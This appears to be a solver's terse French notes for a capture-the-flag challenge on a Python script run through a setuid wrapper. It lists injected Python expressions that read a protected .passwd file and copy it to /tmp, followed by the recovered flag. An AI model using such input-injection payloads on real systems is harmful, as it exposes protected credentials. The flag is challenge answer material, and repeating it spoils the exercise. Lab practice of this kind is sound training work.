
Password accepté : int(open(".passwd").readline().strip())

SOLUTIONS :

au début ils disent " /tmp and /var/tmp are writeable " donc

./setuid-wrapper    (car ch6.py n'a pas les droits)

open("/tmp/passwd","w").write(open(".passwd").readline().strip())

nano /tmp/passwd

13373439872909134298363103573901

1 == 1 or int(open(".passwd").readline().strip())

open("/tmp/passwd","w").write(open(".passwd").readline().strip())


1 == 1 or 3